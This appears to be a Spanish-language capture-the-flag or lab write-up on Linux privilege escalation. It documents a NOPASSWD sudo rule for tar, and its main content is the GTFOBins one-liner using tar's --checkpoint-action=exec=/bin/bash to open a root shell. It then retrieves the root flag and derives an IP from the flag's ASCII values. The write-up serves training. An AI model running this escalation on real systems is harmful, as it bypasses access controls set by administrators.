# Task 7 Escalada de privilegios en Linux

## Información general 
- **Herramientas utilizadas:**  https[:]//gtfobins[.]org/ y https[:]//www[.]ascii-code.com/

---

## Investigación Inicial

Mediante la busqueda de información a lo largo del sistema, se pueden recolectar pistas, tales como: 

1) Usando `cat /home/dnedry/.bashrc`, como método de inspección para este archivo, al final del mismo tenemos la instrucción:

```bash
sudo() {
    # Si el alumno intenta conseguir una consola de root...
    if [[ "$1" == "su" || "$1" == "-i" || "$1" == "bash" || "$1" == "/bin/bash" || "$1" == "sh" ]]; then
        # 1. Fingimos pedir la contraseña
        read -s -p "[sudo] password for $USER: " pass
        echo ""
        
        # 2. Pequeña pausa dramática
        sleep 1
        
        # 3. Lanzamos el mensaje personalizado
        echo " "
        echo "AH AH AH! YOU DIDN'T SAY THE MAGIC WORD!"
        sleep 0.2
        echo " "
        echo "AH AH AH! YOU DIDN'T SAY THE MAGIC WORD!"
        sleep 0.2
        echo " "
        echo "AH AH AH! YOU DIDN'T SAY THE MAGIC WORD!"
        sleep 0.2
        echo " "
        echo "AH AH AH! YOU DIDN'T SAY THE MAGIC WORD!"
        sleep 0.2
        echo " "
        echo "AH AH AH! YOU DIDN'T SAY THE MAGIC WORD!"
        sleep 0.2
        echo " "
        echo "AH AH AH! YOU DIDN'T SAY THE MAGIC WORD!"
        sleep 0.2
        echo " "
        echo "AH AH AH! YOU DIDN'T SAY THE MAGIC WORD!"
        sleep 0.2
        echo " "
        echo "AH AH AH! YOU DIDN'T SAY THE MAGIC WORD!"
        echo " "
    else
        # Si intenta usar el exploit de tar u otro comando, lo dejamos pasar al sudo real
        command sudo "$@"
    fi
}
```
Por lo que al inspeccionar este archivo, tenemos el primer dato importante: existe un exploit en tar.

2) Usando `sudo -l` obtenemos los comandos que se pueden ejecutar con sudo, y aquellos que no requieren de contraseña:

```bash
Matching Defaults entries for dnedry on lab-nublar-os:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dnedry may run the following commands on lab-nublar-os:
    (root) NOPASSWD: /bin/tar
    (ALL : ALL) !/bin/su, !/bin/bash, !/bin/sh, !/bin/zsh
```

---

## Explotación de la vulnerabilidad
Revisando GTFOBins, tenemos que tar incluye opciones como `--checkpoint` y `--checkpoint-action`, diseñadas originalmente para ejecutar acciones durante el proceso de archivado. Al combinarlas, es posible forzar la ejecución de un comando arbitrario en momentos específicos del proceso. 

En este caso, se utiliza un archivo de destino irrelevante `(/dev/null)` y un archivo de entrada también ficticio, ya que el objetivo no es comprimir datos, sino activar el mecanismo interno del programa. Luego, se configura un checkpoint con `--checkpoint=1`, lo que provoca que la acción se ejecute inmediatamente, y se define `--checkpoint-action=exec=/bin/bash`, que ordena al sistema lanzar una shell. 

Como el comando se ejecuta mediante sudo, esa shell hereda privilegios de root. Esta técnica no es un exploit externo, sino un abuso de funcionalidades legítimas del propio binario, y está documentada en bases de datos, como la de GTFOBins, que recopilan herramientas del sistema que pueden ser utilizadas para escalada de privilegios cuando están mal configuradas en entornos Linux.

Por lo que el comando final para acceder a root estaría dado por: 

`sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`

## 1) ¿Qué pasa cuando se cambia de usuario?
Cuando se intenta cambiar de usuario con comandos como `sudo su`, `sudo -i`, `sudo bash`, `sudo sh` o `sudo /bin/bash`, se ejecuta la función interceptor de sudo definida en `/home/dnedry/.bashrc`. Esta función intercepta el intento, no ejecuta el comando real, y en su lugar imprime repetidamente en pantalla: `'AH AH AH! YOU DIDN'T SAY THE MAGIC WORD!'`

---

## 2) ¿Qué herramienta es vulnerable?
La herramienta vulnerable es tar, tal como se demostró anteriormente en el análisis de vulnerabilidades.

Esta mala configuración de privilegios, combinada con las funcionalidades legítimas de tar documentadas en GTFOBins y las versiones desactualizadas del sistema, permiten la escalada de privilegios.

---

## 3) ¿Cuál es la flag de root?
La flag de root es YOU.C4N.D0.1T, obtenida a traves de `cat '/root/\r00t\'`

Aunque, también se puede obtener mediante `grep -R "." /root 2>/dev/null`, esto debido a que analizando el formato de la FLAG previamente, ya que se encuentra en la página del ejercicio, se sabe que tiene un punto en su estructura, por lo que al conocer datos que podrían ser insignificantes, se puede realizar una busqueda para buscar formatos, en donde tenemos el resultado: 

```bash
/root/.profile:# ~/.profile: executed by Bourne-compatible login shells.
/root/.profile:if [ "$BASH" ]; then
/root/.profile:  if [ -f ~/.bashrc ]; then
/root/.profile:    . ~/.bashrc
/root/.profile:  fi
/root/.profile:fi
/root/.profile:mesg n || true
/root/\r00t\:YOU.C4N.D0.1T
/root/.bashrc:# ~/.bashrc: executed by bash(1) for non-login shells.
/root/.bashrc:# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
/root/.bashrc:# for examples
....
....
```
Aunque cabe aclarar que realizar una busqueda utilizando solamente un elemento tan común como un punto, puede llevar a una lista inmensa de resultados y en la mayoría de los casos, resultar poco práctico.

---

## 4) ¿Qué IP ejecutó el proceso?
La IP que ejecutó el proceso se obtiene convirtiendo la flag de root (YOU.C4N.D0.1T) en una dirección IPv4, sumando los valores ASCII de cada segmento: 

| Segmento | Caracteres | Valores ASCII | Suma |
|----------|------------|---------------|------|
| 1 | Y, O, U | 89 + 79 + 85 | **253** |
| 2 | C, 4, N | 67 + 52 + 78 | **197** |
| 3 | D, 0 | 68 + 48 | **116** |
| 4 | 1, T | 49 + 84 | **133** |

**IP resultante:** `253.197.116.133`



